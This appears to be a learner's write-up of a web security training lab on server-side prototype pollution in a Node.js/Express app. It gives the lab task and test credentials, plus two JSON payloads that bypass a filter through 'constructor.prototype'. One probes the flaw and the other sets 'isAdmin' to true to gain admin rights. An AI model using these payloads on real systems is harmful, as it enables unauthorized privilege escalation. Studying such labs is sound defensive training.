Lab: Bypassing flawed input filters for server-side prototype pollution


This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges 
user-controllable input into a server-side JavaScript object.


To solve the lab:
1. Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
2. Identify a gadget property that you can use to escalate your privileges.
3. Access the admin panel and delete the user carlos.


You can log in to your own account with the following credentials: wiener:peter



sending the request of this, breaks the JSON:

"constructor": {
    "prototype": {
        "json space prop":10
    }
}

Therefore i know this works and looking at the isAdmin gadget i changed the property to true from false with:

"constructor": {
    "prototype": {
        "isAdmin":true
    }
}
